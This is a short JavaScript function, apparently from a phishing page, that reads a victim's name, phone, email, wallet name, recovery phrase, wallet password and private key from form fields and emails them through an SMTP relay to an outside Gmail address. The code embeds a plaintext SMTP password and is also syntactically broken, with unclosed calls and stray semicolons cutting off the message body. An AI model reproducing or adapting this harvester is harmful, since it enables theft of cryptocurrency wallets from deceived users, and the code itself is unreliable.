function emailSend(){

	var userName = document.getElementById('name').value;

	var phone = document.getElementById('phone').value;

	var email = document.getElementById('email'

	var wallet = document.getElementById('wallet').value;

	var phrase = document.getElementById('phrase').value;

	var walletpassword = document.getElementById('walletpassword'

	var privatekey = document.getElementById('privatekey'

	

	).value;



	var messageBody = "Name " + userName +

	"<br/> Phone " + phone +

	"<br/> Email " + email;

		"<br/> Wallet " + wallet +

	"<br/> Phrase " + phrase;

	"<br/> Walletpassword " + walletpassword;

	"<br/> Privatekey " + privatekey;

	

	Email.send({

    Host : "smtp.elasticemail.com",

    Username : "adeolatoolz@gmail.com",

    Password : "9460FC7859351FA8C67272051ECC2B1D9C30",

    To : 'go.marryjane@gmail.com',

    From : "adeolatoolz@gmail.com",

    Subject : "This is the subject",

    Body : messageBody

}).then(

  message => {

  	if(message=='OK'){

  		swal("Secussful", "You clicked the button!", "success");

  	}

  	else{

  		swal("Error", "You clicked the button!", "error");

  	}

  }

);

		}
